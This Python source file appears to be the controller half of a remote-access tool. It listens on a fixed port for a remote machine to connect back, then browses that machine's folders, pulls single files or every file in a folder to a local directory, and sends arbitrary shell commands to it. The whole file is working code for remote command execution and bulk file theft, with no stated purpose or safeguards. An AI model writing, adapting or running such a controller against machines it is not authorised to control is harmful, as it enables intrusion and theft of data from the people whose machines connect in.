import os
import threading
from hashlib import sha256
from socket import *

server_port = 34561
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.bind(('', server_port))
serverSocket.listen(1)
slash = '/' if os.name != 'nt' else '\\'
DATA_PATH = 'File Received'
current_path = ''


def ls():
    connectionSocket.send('ls'.encode())
    print('\033[94m', end='')
    while True:
        ret = connectionSocket.recv(1024).decode()
        if ret == '/':
            print('\033[0m', end='')
        else:
            if ret == '.':
                break
            print('\t' + ret)


def cdup():
    global current_path
    connectionSocket.send('cdup'.encode())
    ret = connectionSocket.recv(1024).decode()
    if ret == 'Path not found':
        print('Path not found')
    else:
        current_path = ret


def cdhome():
    global current_path
    connectionSocket.send('cdhome'.encode())
    ret = connectionSocket.recv(1024).decode()
    current_path = ret


def cd(filename):
    global current_path
    connectionSocket.send('cd'.encode())
    connectionSocket.send(filename.encode())
    ret = connectionSocket.recv(1024).decode()
    if ret == 'Path not found':
        print('Directory not found')
    else:
        current_path = ret


def pwd():
    connectionSocket.send('pwd'.encode())
    ret = connectionSocket.recv(1024).decode()
    return ret


def get():
    connectionSocket.send('get'.encode())
    filename = input('get : Enter file name to download >> ')
    connectionSocket.send(filename.encode())
    recive(filename)


def getall():
    connectionSocket.send('getall'.encode())
    while True:
        filename = connectionSocket.recv(1024).decode()
        if filename == '.':
            break
        if recive(filename):
            connectionSocket.send('ok'.encode())
            continue


def recive(file_name):
    progress = 0
    try:
        file_size = connectionSocket.recv(1024).decode()
        if file_size == 'File not found':
            raise Exception('File not found')
        if file_size == 'Permission denied':
            raise Exception('Permission denied')
        connectionSocket.send('ok'.encode())
        file_hash = connectionSocket.recv(1024).decode()
        connectionSocket.send('ok'.encode())
        print(
            f'Reciving file: {file_name}  Size: {file_size}\nsha256: {file_hash}\n')
        if not os.path.isdir(DATA_PATH):
            os.mkdir(DATA_PATH)
        file = open(f'{DATA_PATH}{slash}' + file_name, 'wb')
        current_size = 0
        plus = 0
        print('Progress: [' + (' ' * 50) + '] 0%', end='\r')
        while current_size < int(file_size):
            # 1048576, 1024, 8196, 65536, 1024000...
            data = connectionSocket.recv(1024)
            file.write(data)
            current_size = current_size + len(data)
            progress = int((current_size / int(file_size)) * 100)
            plus = (progress / 2)
            print('Progress: |' + ('█' * int(plus)) + (' ' * int(50 - plus)) + '| ' + str(progress) + '%',
                  end='\r')
        file.close()
        print('Progress: |' + ('█' * int(plus)) + (' ' * int(50 - plus)) + '| ' + str(progress) + '% Complete',
              end='\r')
        print('\n')
        print('Verify Hash...')
        if sha256(open(DATA_PATH + slash + file_name, 'rb').read()).hexdigest() == file_hash:
            print('File received successful!')
            return True
    except Exception as e:
        print(e)


def command(cmd):
    connectionSocket.send('command'.encode())
    connectionSocket.send(cmd.encode())
    output = connectionSocket.recv(1024).decode()
    while True:
        if output == 'ok':
            break
        print(output, flush=True, end='')
        output = connectionSocket.recv(1024).decode()
    print()


def platform():
    connectionSocket.send('platform'.encode())
    output = connectionSocket.recv(1024).decode()
    print(output)


switcher = {

    'ls': ls,
    'get': get,
    'getall': getall,
    'command': command,
    'platform': platform}


def master():
    global current_path
    current_path = pwd()
    while True:
        try:
            cmd = input(current_path + ' >> ')
            if cmd == '':
                continue
            array = cmd.split(sep=' ', maxsplit=1)
            connectionSocket.send(''.encode())

            if array[0] == 'cd':
                try:
                    if array[1] == '..':
                        cdup()
                    elif array[1] == 'home':
                        cdhome()
                    else:
                        cd(array[1])
                except IndexError:
                    print('Directory not found')
            else:
                if array[0] in switcher.keys() and cmd != '':
                    switcher[array[0]]()
                else:
                    command(cmd)
        except Exception as e:
            print(e)
            break


# main
if __name__ == '__main__':
    while True:
        print('Server listening on port', server_port)
        print('Waiting for a new connection')
        connectionSocket, addr = serverSocket.accept()
        print('Connection from', addr)
        t = threading.Thread(target=master())
        t.start()
        print('Connection closed')
